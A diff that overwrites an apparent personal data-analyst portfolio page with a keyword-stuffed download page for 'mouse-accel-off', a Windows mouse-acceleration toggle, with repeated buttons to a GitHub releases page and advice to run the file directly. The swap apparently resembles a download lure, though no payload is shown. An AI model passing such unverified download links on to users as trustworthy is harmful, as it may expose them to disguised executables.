@@ -1,654 +1,409 @@
-<!doctype html>
-<html lang="en" data-entry-preloader>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#bce4ed">
-  <meta name="description" content="Daffa Zahy Khairy — data analyst and Informatics student at Telkom University. Case studies in procurement, retention, finance, and network analytics.">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Daffa Zahy Khairy — Data analyst portfolio">
-  <meta property="og:description" content="Data analyst and Informatics student at Telkom University: four case studies built on synthetic data, an IEEE paper, and teaching experience.">
-  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
-  <title>Daffa Zahy Khairy — Data analyst portfolio</title>
-  <script src="nav-intro.js"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Anton&amp;family=DM+Mono:wght@400;500&amp;family=Hanken+Grotesk:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="layout.css">
-  <link rel="stylesheet" href="motion.css">
-  <link rel="stylesheet" href="playground.css">
-  <link rel="stylesheet" href="project-viewer.css">
-  <link rel="stylesheet" href="pulse-demo.css">
-  <link rel="stylesheet" href="background.css">
-  <link rel="stylesheet" href="physics.css">
-  <link rel="stylesheet" href="marquee.css">
-  <link rel="stylesheet" href="service-art.css">
-  <link rel="stylesheet" href="living-studio.css">
-  <link rel="stylesheet" href="nav-desktop.css">
-  <link rel="stylesheet" href="entry.css">
-  <link rel="stylesheet" href="professional.css">
-  <link rel="stylesheet" href="services-layout.css">
-  <link rel="stylesheet" href="nav-drag.css">
-  <link rel="stylesheet" href="about-layout.css">
-  <link rel="stylesheet" href="chapter-scroll.css">
-  <link rel="stylesheet" href="profile.css?v=4">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>mouse-accel-off - Easily Toggle Enhanced Pointer Precision</title>
+<meta name="description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<meta name="keywords" content="mouse-accel-off, enhanced pointer precision, mouse acceleration, windows utility, toggle mouse acceleration, desktop app, mouse-accel-off-windows, mouse-accel-off-download">
+<meta name="author" content="mouse-accel-off">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="mouse-accel-off - Easily Toggle Enhanced Pointer Precision">
+<meta property="og:description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/Pranavsiripangi/mouse-accel-off">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mouse-accel-off - Easily Toggle Enhanced Pointer Precision">
+<meta name="twitter:description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<style>
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  background: #f8fafc;
+  color: #1e293b;
+  margin: 0;
+  padding: 0;
+  line-height: 1.6;
+}
+.container {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 2rem 1.5rem;
+}
+h1 {
+  font-size: 2.2rem;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 1rem;
+  line-height: 1.2;
+}
+h2 {
+  font-size: 1.6rem;
+  font-weight: 600;
+  color: #1e293b;
+  margin-top: 2.5rem;
+  margin-bottom: 1rem;
+  border-bottom: 2px solid #e2e8f0;
+  padding-bottom: 0.5rem;
+}
+h3 {
+  font-size: 1.25rem;
+  font-weight: 600;
+  color: #334155;
+  margin-top: 1.5rem;
+  margin-bottom: 0.75rem;
+}
+p {
+  margin-bottom: 1rem;
+  font-size: 1.05rem;
+}
+a {
+  color: #2563eb;
+  text-decoration: none;
+}
+a:hover {
+  text-decoration: underline;
+}
+.btn-primary {
+  display: inline-block;
+  background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+  color: #ffffff;
+  font-weight: 600;
+  padding: 0.9rem 2.2rem;
+  border-radius: 50px;
+  text-decoration: none;
+  box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+  font-size: 1.1rem;
+  margin: 1rem 0;
+}
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
+  text-decoration: none;
+}
+.btn-large {
+  padding: 1.2rem 2.8rem;
+  font-size: 1.25rem;
+}
+.badge-container {
+  margin: 1.5rem 0;
+}
+.card {
+  background: #ffffff;
+  border-radius: 16px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+  padding: 1.5rem 2rem;
+  margin: 1.5rem 0;
+  border: 1px solid #e9eef3;
+}
+ul, ol {
+  margin-bottom: 1rem;
+  padding-left: 1.5rem;
+}
+li {
+  margin-bottom: 0.5rem;
+}
+.footer {
+  margin-top: 3rem;
+  padding-top: 2rem;
+  border-top: 1px solid #e2e8f0;
+  font-size: 0.9rem;
+  color: #64748b;
+}
+@media (max-width: 600px) {
+  .container { padding: 1rem; }
+  h1 { font-size: 1.8rem; }
+  .btn-primary { padding: 0.8rem 1.6rem; font-size: 1rem; }
+  .btn-large { padding: 1rem 2rem; font-size: 1.1rem; }
+  .card { padding: 1rem 1.2rem; }
+}
+</style>
 </head>
-<body id="top">
-  <div class="entry-screen" id="entryScreen" data-phase="ready" data-helper="phone">
-    <div class="entry-film entry-film--left" aria-hidden="true">
-      <div class="entry-film-material"></div>
-      <div class="entry-orbit"></div><div class="entry-stage"></div>
-      <span class="entry-dialog entry-dialog--lead">Need a hand.</span>
-      <div class="entry-crew entry-crew--lead"><svg class="entry-person" viewBox="0 0 30 42" aria-hidden="true" shape-rendering="crispEdges">
-            <g class="crew-leg crew-leg--back"><path d="M11 28h6v10h-6z" fill="#243d4d"/><path d="M10 37h9v4h-9z" fill="#152c3e"/><path d="M10 40h9v1h-9z" fill="#f7f5e9"/></g>
-            <g class="crew-leg crew-leg--front"><path d="M17 28h6v10h-6z" fill="#365467"/><path d="M16 37h10v4H16z" fill="#152c3e"/><path d="M16 40h10v1H16z" fill="#f7f5e9"/></g>
-            <g class="crew-body"><path d="M10 17h12v13H10z" fill="#b75432"/><path d="M12 18h2v10h-2z" fill="#ffffff" opacity=".22"/><path d="M15 14h5v5h-5z" fill="#c9926d"/><g class="crew-free-arm"><path d="M8 19h4v7H8z" fill="#b75432"/><path d="M8 25h4v4H8z" fill="#e5b28a"/></g>
-            <g class="crew-head"><path d="M11 6h12v9H11zM21 10h4v3h-4zM13 15h8v2h-8z" fill="#e5b28a"/><path d="M10 5h6v7h-6z" fill="#273947"/><path d="M11 3h11v4H11zM9 6h17v2H9z" fill="#c05a32"/><path class="crew-eye" d="M21 9h2v2h-2z" fill="#152c3e"/><path class="crew-mouth" d="M21 14h3v1h-3z" fill="#86513d"/></g>
-            <g class="crew-arm"><path d="M20 19h5v5h-5z" fill="#b75432"/><g class="crew-hand"><path d="M23 22h6v3h-6zM27 21h3v4h-3z" fill="#e5b28a"/><path class="crew-thumb" d="M27 22h2v2h-2z" fill="#bc8967"/><circle class="crew-rope-contact" cx="28" cy="23" r=".1" fill="none"/></g></g></g>
-          </svg><span class="crew-effort"></span><span class="crew-dust crew-dust--back"></span><span class="crew-dust crew-dust--front"></span><span class="crew-dust crew-dust--heel"></span></div>
-      <svg class="entry-tether" aria-hidden="true"><path class="tether-underlay"/><path class="tether-line"/></svg><span class="entry-grip"></span>
-    </div>
-    <div class="entry-film entry-film--right" aria-hidden="true">
-      <div class="entry-film-material"></div>
-      <div class="entry-orbit"></div><div class="entry-stage"></div>
-      <span class="entry-rope-rest" aria-hidden="true"></span>
-      <span class="entry-dialog entry-dialog--helper">Together.</span>
-      <div class="entry-crew entry-crew--helper">
-        <svg class="entry-idle-person" viewBox="0 0 30 42" aria-hidden="true" shape-rendering="crispEdges">
-          <path d="M9 28h6v11H9zM18 28h6v11h-6z" fill="#243d4d"/><path d="M7 37h8v4H7zM18 37h9v4h-9z" fill="#152c3e"/><path d="M7 40h8v1H7zM18 40h9v1h-9z" fill="#f7f5e9"/>
-          <path d="M8 17h16v13H8zM7 19h4v7H7zM22 19h4v7h-4z" fill="#43888c"/><path d="M11 18h2v10h-2z" fill="#fff" opacity=".22"/><path d="M20 27h3v3h-3z" fill="#2f6974"/><path d="M14 14h5v4h-5z" fill="#c9926d"/>
-          <g class="crew-idle-head"><path d="M10 6h13v10H10zM8 10h2v3H8zM23 10h2v3h-2z" fill="#e5b28a"/><path d="M9 4h15v4H9zM7 7h19v2H7z" fill="#152c3e"/><path d="M11 10h5v3h-5zM18 10h5v3h-5zM16 11h2v1h-2z" fill="#152c3e"/><g class="crew-idle-eyes"><path d="M13 11h1v1h-1zM20 11h1v1h-1z" fill="#c9e6e5"/></g><path d="M16 14h3v1h-3z" fill="#86513d"/></g>
-          <g class="crew-phone-hold"><path d="M10 24h6v3h-6zM19 24h6v3h-6z" fill="#e5b28a"/><g class="crew-phone"><path d="M15 20h6v10h-6z" fill="#152c3e"/><path d="M16 21h4v7h-4z" fill="#c5e9e7"/><path d="M17 22h2v1h-2zM17 25h2v1h-2z" fill="#4e9398"/><path d="M17 29h2v1h-2z" fill="#849da3"/></g><path class="crew-phone-thumb" d="M19 25h3v2h-3z" fill="#e5b28a"/></g>
-        </svg>
-        <svg class="entry-person" viewBox="0 0 30 42" aria-hidden="true" shape-rendering="crispEdges">
-            <g class="crew-leg crew-leg--back"><path d="M11 28h6v10h-6z" fill="#243d4d"/><path d="M10 37h9v4h-9z" fill="#152c3e"/><path d="M10 40h9v1h-9z" fill="#f7f5e9"/></g>
-            <g class="crew-leg crew-leg--front"><path d="M17 28h6v10h-6z" fill="#365467"/><path d="M16 37h10v4H16z" fill="#152c3e"/><path d="M16 40h10v1H16z" fill="#f7f5e9"/></g>
-            <g class="crew-body"><path d="M10 17h12v13H10z" fill="#43888c"/><path d="M12 18h2v10h-2z" fill="#ffffff" opacity=".22"/><path d="M15 14h5v5h-5z" fill="#c9926d"/><g class="crew-free-arm"><path d="M8 19h4v7H8z" fill="#43888c"/><path d="M8 25h4v4H8z" fill="#e5b28a"/></g>
-            <g class="crew-head"><path d="M11 6h12v9H11zM21 10h4v3h-4zM13 15h8v2h-8z" fill="#e5b28a"/><path d="M10 5h6v7h-6z" fill="#273947"/><path d="M11 3h11v4H11zM9 6h17v2H9z" fill="#152c3e"/><path d="M15 10h4v3h-4zM20 10h4v3h-4z" fill="#152c3e"/><path d="M19 11h1" stroke="#152c3e"/><path class="crew-eye" d="M21 9h2v2h-2z" fill="#152c3e"/><path class="crew-mouth" d="M21 14h3v1h-3z" fill="#86513d"/></g>
-            <g class="crew-arm"><path d="M20 19h5v5h-5z" fill="#43888c"/><g class="crew-hand"><path d="M23 22h6v3h-6zM27 21h3v4h-3z" fill="#e5b28a"/><path class="crew-thumb" d="M27 22h2v2h-2z" fill="#bc8967"/><circle class="crew-rope-contact" cx="28" cy="23" r=".1" fill="none"/></g></g></g>
-          </svg><span class="crew-effort"></span><span class="crew-dust crew-dust--back"></span><span class="crew-dust crew-dust--front"></span><span class="crew-dust crew-dust--heel"></span></div>
-      <svg class="entry-tether" aria-hidden="true"><path class="tether-underlay"/><path class="tether-line"/></svg><span class="entry-grip"></span>
-    </div>
-    <div class="entry-seal" aria-hidden="true"><span></span></div>
-    <div class="entry-masthead"><span data-brand>DAFFA ZAHY KHAIRY</span><button class="entry-skip" id="entrySkip" type="button">Skip intro <span aria-hidden="true">↗</span></button></div>
-    <div class="entry-copy" aria-hidden="true"><span class="entry-eyebrow">Two minds. One heavy door.</span><span class="entry-thought"><span>MAKE ROOM.</span><em>For ideas in motion.</em></span></div>
-    <button class="entry-assist" id="entryAssist" type="button" aria-label="Help the crew open the studio" title="Give them a hand"><span aria-hidden="true"></span></button>
-    <div class="entry-footnote" aria-hidden="true"><span class="entry-invitation">Tap the latch. Help them open the studio.</span><span class="entry-thanks">That helped. Watch the door move.</span></div>
-  </div>
-  <a class="skip-link" href="#mainContent">Skip to content</a>
-  <header class="site-header">
-    <span class="nav-lens" aria-hidden="true"><span class="nav-glint"></span></span>
-    <div class="header-inner page-width">
-      <a class="site-brand" href="index.html?intro=1" aria-label="Back to home and replay intro"><span class="studio-emblem" aria-hidden="true"><i class="studio-pixel"></i><i class="studio-pixel"></i><i class="studio-pixel"></i><i class="studio-pixel"></i></span><span data-brand>DAFFA ZAHY KHAIRY</span></a>
-      <nav class="site-nav" aria-label="Main navigation">
-        <a href="#work">Work</a><a href="#about">About</a><a href="#services">Skills</a><span class="nav-section-glass" aria-hidden="true"><span class="nav-section-progress"></span></span><span class="nav-glass-grab" aria-hidden="true" data-cursor="Drag" title="Drag to navigate"></span><a href="contact.html">Contact</a>
-      </nav>
-      <button class="menu-toggle" id="menuToggle" type="button" aria-expanded="false" aria-controls="mobileMenu">Menu <span aria-hidden="true">+</span></button>
-    </div>
-    <nav class="mobile-menu" id="mobileMenu" aria-label="Mobile navigation">
-      <a href="#work">Work</a><a href="#about">About</a><a href="#experience">Experience</a><a href="#services">Skills</a><a href="#credentials">Credentials</a><a href="contact.html">Contact</a>
-    </nav>
-  </header>
-  <main id="mainContent" tabindex="-1">
-    <section class="hero" aria-labelledby="heroTitle">
-      <div class="hero-grid page-width">
-        <div class="hero-center">
-          <div class="hero-type" id="heroType" data-cursor="Play">
-            <h1 id="heroTitle"><span class="hero-line">MADE TO</span><span class="hero-line">STAND OUT.</span></h1>
-            <canvas id="heroParticles" aria-hidden="true"></canvas>
-            <span class="type-hint" aria-hidden="true">MOVE YOUR CURSOR ↗</span>
-          </div>
-          <div class="hero-actions">
-            <a class="button" href="#work">Explore work <span aria-hidden="true">↘</span></a>
-            <a class="text-link" href="contact.html">Get in touch <span aria-hidden="true">↗</span></a>
-          </div>
-        </div>
-        <aside class="hero-aside" aria-label="Introduction">
-          <p class="hero-identity"><span data-name>Daffa Zahy Khairy</span> /<br><span data-role>data analyst · informatics, Telkom University</span></p>
-          <p class="hero-summary">I turn operational data into decisions people can check — analysis, models, and the small tools around them.<br><small>Informatics · Telkom University · GPA 3.69</small></p>
-          <button class="hero-preview" type="button" data-open="kinetix" data-cursor="View" aria-label="View Kinetix">
-            <img src="assets/projects/kinetix.webp" width="1600" height="1000" alt="Kinetix landing page" decoding="async">
-            <span>Project preview <span aria-hidden="true">↗</span></span>
-          </button>
-        </aside>
-        <div class="hero-meta"><span>Based in <span data-location>Bandung, Indonesia</span></span><span data-availability>Open to data analyst roles and internships</span></div>
-      </div>
-    </section>
+<body>
+<div class="container">
+<h1>🖱️ mouse-accel-off - Toggle Enhanced Pointer Precision Easily</h1>
+<div class="badge-container">
+<a href="https://github.com/Pranavsiripangi/mouse-accel-off/releases" class="btn-primary btn-large" style="background: linear-gradient(135deg, #10b981, #3b82f6);">⬇️ Download Mouse Accel Off</a>
+</div>
+<p>Mouse Accel Off is a desktop utility for Windows that makes it simple to view and control Enhanced Pointer Precision. Whether you're a gamer, designer, or everyday user, you can quickly turn mouse acceleration off for precise cursor movement or turn it back on when you need it. The tool displays the current state of Enhanced Pointer Precision and lets you change it with a single click.</p>
 
-    <section class="work section-space" id="work" aria-labelledby="workTitle">
-      <div class="page-width">
-        <div class="section-heading section-heading--split reveal">
-          <h2 id="workTitle">Selected work</h2>
-          <p>Projects I made for myself.<br>Each one explores a different problem.</p>
-        </div>
-        <p class="work-progress" aria-hidden="true"><span id="workCounter">00</span><span class="work-progress-rule"></span><span data-project-total>03</span></p>
-        <div class="project-grid">
-          <article class="project-card project-card--featured reveal" data-project="kinetix">
-            <button class="project-open" type="button" data-open="kinetix" data-cursor="View" aria-label="View Kinetix, procurement analytics prototype">
-              <span class="project-art"><img class="project-image" src="assets/projects/kinetix.webp" width="1600" height="1000" alt="Kinetix landing page: “Calm procurement. Sharp decisions.” beside a glass sculpture of stacked layers" loading="lazy" decoding="async"><span class="project-handoff" aria-hidden="true"><img src="assets/pixel-guide.svg" width="40" height="56" alt=""><span>Supplier scorecard</span></span><span class="project-open-label" aria-hidden="true">View project ↗</span></span>
-              <span class="project-caption"><span><strong>Kinetix</strong><span class="project-discipline">Procurement analytics</span></span><span class="project-number">Prototype / 01</span></span>
-            </button>
-            <a class="case-entry" href="case-kinetix.html">Read the Kinetix case study <span aria-hidden="true">↗</span></a>
-          </article>
-          <article class="project-card reveal" data-project="retentionos">
-            <button class="project-open" type="button" data-open="retentionos" data-cursor="View" aria-label="View RetentionOS, churn early warning prototype">
-              <span class="project-art"><img class="project-image" src="assets/projects/retentionos.webp" width="1600" height="1000" alt="RetentionOS guide page: the name set large behind a miniature town where one weakening connection is caught early" loading="lazy" decoding="async"><span class="project-handoff" aria-hidden="true"><img src="assets/pixel-guide.svg" width="40" height="56" alt=""><span>60-day risk radar</span></span><span class="project-open-label" aria-hidden="true">View project ↗</span></span>
-              <span class="project-caption"><span><strong>RetentionOS</strong><span class="project-discipline">Churn early warning</span></span><span class="project-number">Prototype / 02</span></span>
-            </button>
-            <a class="case-entry" href="case-retentionos.html">Read the RetentionOS case study <span aria-hidden="true">↗</span></a>
-          </article>
-          <article class="project-card reveal" data-project="vera">
-            <button class="project-open" type="button" data-open="vera" data-cursor="View" aria-label="View Vera, invoice reconciliation prototype">
-              <span class="project-art"><img class="project-image" src="assets/projects/vera.webp" width="1600" height="1000" alt="Vera landing page: verify invoices with clear evidence, beside three stacked documents with a flagged row and a green approval seal" loading="lazy" decoding="async"><span class="project-handoff" aria-hidden="true"><img src="assets/pixel-guide.svg" width="40" height="56" alt=""><span>Three-way match</span></span><span class="project-open-label" aria-hidden="true">View project ↗</span></span>
-              <span class="project-caption"><span><strong>Vera</strong><span class="project-discipline">Invoice reconciliation</span></span><span class="project-number">Prototype / 03</span></span>
-            </button>
-            <a class="case-entry" href="case-vera.html">Read the Vera case study <span aria-hidden="true">↗</span></a>
-          </article>
-          <article class="project-card reveal" data-project="tiktory">
-            <button class="project-open" type="button" data-open="tiktory" data-cursor="View" aria-label="View Tiktory, field expansion planning prototype">
-              <span class="project-art"><img class="project-image" src="assets/projects/tiktory.webp" width="1600" height="1000" alt="Tiktory landing page: a framed isometric neighbourhood with three labelled zones and the name TIKTORY across the bottom" loading="lazy" decoding="async"><span class="project-handoff" aria-hidden="true"><img src="assets/pixel-guide.svg" width="40" height="56" alt=""><span>Survey to decision</span></span><span class="project-open-label" aria-hidden="true">View project ↗</span></span>
-              <span class="project-caption"><span><strong>Tiktory</strong><span class="project-discipline">Field expansion planning</span></span><span class="project-number">Prototype / 04</span></span>
-            </button>
-            <a class="case-entry" href="case-tiktory.html">Read the Tiktory case study <span aria-hidden="true">↗</span></a>
-          </article>
-        </div>
-        <div class="more-work">
-          <div class="more-work-head reveal"><h3>More projects.</h3><p>Coursework, a capstone, and side projects — smaller, but each one shipped or is in progress.</p></div>
-          <ul class="more-grid" role="list">
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/intellitix.webp" width="912" height="570" alt="The IntelliTix team at the faculty computing exhibition with the app on two screens" loading="lazy" decoding="async"></figure><span class="more-tag">Capstone · Business analyst</span><h4>IntelliTix</h4><p>An IT change-request platform with an AI chatbot assistant; selected for the faculty’s computing exhibition, Jan 2026.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/heartcheck.webp" width="728" height="455" alt="HeartCheck landing page about starting to look after your heart" loading="lazy" decoding="async"></figure><span class="more-tag">Ongoing · ML web app</span><h4>HeartCheck</h4><p>Heart-disease risk assessment and monitoring from key health indicators.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/netflix.webp" width="717" height="448" alt="Notebook comparing classic models with BERT for review sentiment" loading="lazy" decoding="async"></figure><span class="more-tag">NLP · Python</span><h4>Netflix review sentiment</h4><p>SVM, random forest, and logistic regression compared with BERT on Google Play reviews.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/olympic.webp" width="1139" height="712" alt="Dark dashboard with a world map in an Olympic participation analysis" loading="lazy" decoding="async"></figure><span class="more-tag">EDA · Chart.js, D3.js</span><h4>120 years of the Olympics</h4><p>A scroll-driven dashboard on participation, gender, national dominance, and athlete build.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/knn.webp" width="730" height="456" alt="Slide showing the KNN accuracy score and classification report" loading="lazy" decoding="async"></figure><span class="more-tag">ML · Coursework</span><h4>Pumpkin seed classification</h4><p>Telling look-alike seeds apart with KNN: outlier removal, feature selection, normalisation, an 80/20 split.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/velocity.webp" width="736" height="460" alt="Velocity landing page for advanced activity analytics" loading="lazy" decoding="async"></figure><span class="more-tag">Ongoing · Data viz</span><h4>Velocity activity insights</h4><p>Strava-style activity analytics in vanilla JavaScript, turning distance, duration, and intensity into insights.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/gohealthy.webp" width="752" height="470" alt="GoHealthy screens for planning meals and viewing food history" loading="lazy" decoding="async"></figure><span class="more-tag">Web app · Java Spring</span><h4>GoHealthy</h4><p>A healthy-habit tracker with activity scheduling, food tracking, health education, and medication reminders.</p></li>
-            <li class="more-card reveal"><figure class="media-frame"><img src="assets/more/tastecraft.webp" width="653" height="408" alt="TasteCraft welcome screen with recipe bookmarks" loading="lazy" decoding="async"></figure><span class="more-tag">Web app · Team project</span><h4>TasteCraft</h4><p>Recipe search by name, ingredient, or category, with moderated comments and shopping lists.</p></li>
-          </ul>
-        </div>
-      </div>
-    </section>
+<h2>📋 Overview</h2>
+<p>Mouse Accel Off is built for users who want direct control over their mouse behavior without digging through Windows settings. Enhanced Pointer Precision is a feature in Windows that adjusts cursor speed based on how fast you move the mouse. Some users prefer it off for consistent aim, while others prefer it on for smoother navigation. Mouse Accel Off gives you a clear view of the current setting and an easy way to switch it.</p>
+<p>The application is lightweight, runs locally on your PC, and does not require any programming knowledge. You download it, run it, and use the simple interface to toggle the setting. There are no hidden menus, no complex configuration files, and no background services. It is a straightforward desktop utility focused on one task: showing and changing Enhanced Pointer Precision.</p>
 
-    <section class="logo-marquee" id="in-motion" aria-labelledby="marqueeTitle">
-      <div class="page-width marquee-heading reveal">
-        <div><span class="marquee-kicker">The working toolkit</span><h2 id="marqueeTitle">Tools in the loop.</h2></div>
-        <p>Analysis, code, and the visuals that explain them.</p>
-      </div>
-      <div class="marquee-window" data-marquee-row="forward">
-        <div class="marquee-track"><div class="marquee-group">
-          <span class="marquee-tool"><img src="assets/tool-logos/python.svg" width="48" height="48" alt="" aria-hidden="true">Python</span>
-          <span class="marquee-tool marquee-tool--wordmark">R</span>
-          <span class="marquee-tool marquee-tool--wordmark">Excel</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/vscode.svg" width="48" height="48" alt="" aria-hidden="true">VS Code</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/javascript.svg" width="48" height="48" alt="" aria-hidden="true">JavaScript</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/typescript.svg" width="48" height="48" alt="" aria-hidden="true">TypeScript</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/html5.svg" width="48" height="48" alt="" aria-hidden="true">HTML5</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/css3.svg" width="48" height="48" alt="" aria-hidden="true">CSS3</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/git.svg" width="48" height="48" alt="" aria-hidden="true">Git</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/antigravity.svg" width="48" height="48" alt="" aria-hidden="true">Google Antigravity</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/jules.svg" width="48" height="48" alt="" aria-hidden="true">Jules</span>
-        </div></div>
-      </div>
-      <div class="marquee-window marquee-window--reverse" data-marquee-row="reverse">
-        <div class="marquee-track"><div class="marquee-group">
-          <span class="marquee-tool"><img src="assets/tool-logos/photoshop.svg" width="48" height="48" alt="" aria-hidden="true">Adobe Photoshop</span>
-          <span class="marquee-tool marquee-tool--wordmark">CapCut</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/looker.svg" width="48" height="48" alt="" aria-hidden="true">Looker Studio</span>
-          <span class="marquee-tool marquee-tool--wordmark">Figma</span>
-          <span class="marquee-tool marquee-tool--wordmark">Canva</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/blender.svg" width="48" height="48" alt="" aria-hidden="true">Blender</span>
-          <span class="marquee-tool marquee-tool--wordmark">Roblox Studio</span>
-          <span class="marquee-tool"><img src="assets/tool-logos/obsidian.svg" width="48" height="48" alt="" aria-hidden="true">Obsidian</span>
-        </div></div>
-      </div>
-      <div class="page-width marquee-end"><span>Data &amp; development</span><span>Visual, game &amp; reporting</span></div>
-    </section>
+<h2>✨ Key Features</h2>
+<div class="card">
+<ul>
+<li><strong>See the current state:</strong> Instantly view whether Enhanced Pointer Precision is enabled or disabled.</li>
+<li><strong>One-click toggle:</strong> Turn mouse acceleration off or on without navigating through Windows Control Panel.</li>
+<li><strong>Simple, clean interface:</strong> Designed for non-technical users with clear labels and immediate feedback.</li>
+<li><strong>Works on Windows:</strong> Compatible with modern Windows desktop and laptop systems.</li>
+<li><strong>No installation complexity:</strong> Download the application from the releases page and run it directly.</li>
+<li><strong>Portable-friendly:</strong> The utility is self-contained and does not require additional dependencies.</li>
+<li><strong>Instant effect:</strong> Changes apply immediately after toggling, so you can test the difference right away.</li>
+</ul>
+</div>
 
-    <section class="breath-chapter" id="breath" aria-labelledby="breathTitle">
-      <div class="breath-sticky"><div class="page-width breath-inner">
-        <span class="breath-eyebrow">A moment between the work and the thinking</span>
-        <h2 id="breathTitle">An idea needs <span>room to breathe.</span></h2>
-        <div class="breath-drift" aria-hidden="true"><span class="breath-bubble breath-bubble--one"></span><span class="breath-bubble breath-bubble--two"></span><span class="breath-bubble breath-bubble--three"></span><img src="assets/pixel-guide.svg" width="40" height="56" alt=""></div>
-        <div class="breath-end"><span>From the surface to the studio</span><span class="breath-tide" aria-hidden="true"><i></i></span><span>Keep scrolling ↓</span></div>
-      </div></div>
-    </section>
+<h2>🚀 How to Download and Run</h2>
+<p>To get Mouse Accel Off, visit the official releases page. This is the only download source you need.</p>
+<p><a href="https://github.com/Pranavsiripangi/mouse-accel-off/releases" class="btn-primary" style="background: linear-gradient(135deg, #f59e0b, #ef4444);">⬇️ Visit the Releases Page to Download</a></p>
+<p><strong>Download instruction:</strong> Visit this link to download the application.</p>
+<p>Once the download is complete, locate the file on your computer and run it. The Mouse Accel Off window will open and display the current status of Enhanced Pointer Precision. You can then use the toggle control to turn it off or on. No additional setup or configuration is required.</p>
+<p>If you are unsure where the file was saved, check your browser's download folder or the default Downloads location on your Windows PC. The application is ready to use as soon as it launches.</p>
 
-    <section class="about section-space" id="about" aria-labelledby="aboutTitle" data-scroll-story>
-      <div class="page-width about-intro">
-        <div class="section-heading about-label"><h2 id="aboutTitle">How I think.</h2></div>
-        <span class="about-story-edition" aria-hidden="true">Kinetix / procurement study</span>
-      </div>
-      <div class="page-width about-composition">
-        <div class="about-narrative">
-          <ol class="about-chapters" role="list" aria-label="Three moments inside the studio">
-            <li class="about-chapter about-step" id="aboutObserve">
-              <span class="about-step-marker"><span>01</span> Observe</span>
-              <div class="statement about-story">
-                <h3 class="about-chapter-title">Clear thinking.</h3>
-                <p class="about-chapter-copy">I explore web development, visual design, and automation. Each idea starts with the person who will use it.</p>
-                <div class="about-working-note"><span>THE QUESTION / KINETIX</span><p>Which supplier needs attention first, and why?</p></div>
-              </div>
-            </li>
-            <li class="about-chapter about-step" id="aboutCompose">
-              <span class="about-step-marker"><span>02</span> Compose</span>
-              <div class="statement about-story">
-                <h3 class="about-chapter-title">Give the idea<br>a clear direction.</h3>
-                <p class="about-chapter-copy">One score you can take apart. A stock line you can see coming. A way to test a split. Three decisions give the workspace its structure.</p>
-                <p class="about-chapter-note">Clear → show where each number comes from.<br>Bold → make the risk visible early.<br>Useful → let people test the decision.</p>
-              </div>
-            </li>
-            <li class="about-chapter about-step" id="aboutResolve">
-              <span class="about-step-marker"><span>03</span> Resolve</span>
-              <div class="statement about-story">
-                <h3 class="about-chapter-title"><em>Distinctive<br>outcomes.</em></h3>
-                <p class="about-chapter-copy">The notes become Kinetix: a procurement workspace where every supplier score traces back to its purchase orders.</p>
-                <p class="about-chapter-note">A working prototype on synthetic data; no claimed business results.</p><button class="about-result-link" type="button" data-open="kinetix">Explore Kinetix <span aria-hidden="true">→</span></button>
-              </div>
-              <p class="about-location"><span class="about-location-label">Working between</span><span data-location>Jakarta &amp; Bandung</span></p>
-            </li>
-          </ol>
-        </div>
-        <figure class="about-atelier" aria-labelledby="aboutAtelierCaption">
-          <div class="about-film-heading" aria-hidden="true"><span>Inside the studio</span><span>One idea, taking shape</span></div>
-          <div class="about-atelier-stage" data-scene="resolve">
-            <div class="about-visual-camera">
-            <svg class="about-studio-set" viewBox="0 0 480 320" aria-hidden="true" focusable="false">
-              <g class="about-room-shell">
-                <path d="M24 18h432v245H24z" fill="#e9e6db"/>
-                <path d="M24 18h10v245H24z" fill="#d5ded4"/>
-                <path d="M456 18 470 30v234l-14-1z" fill="#d5d8cc"/>
-                <path d="M24 263h432l14 1-30 34H42L24 279z" fill="#d5c9b1"/>
-                <path d="M24 263h432v4H24z" fill="#bcbba8"/>
-                <path d="M24 18h432M24 18v245" fill="none" stroke="#f3f0e4" stroke-width="2"/>
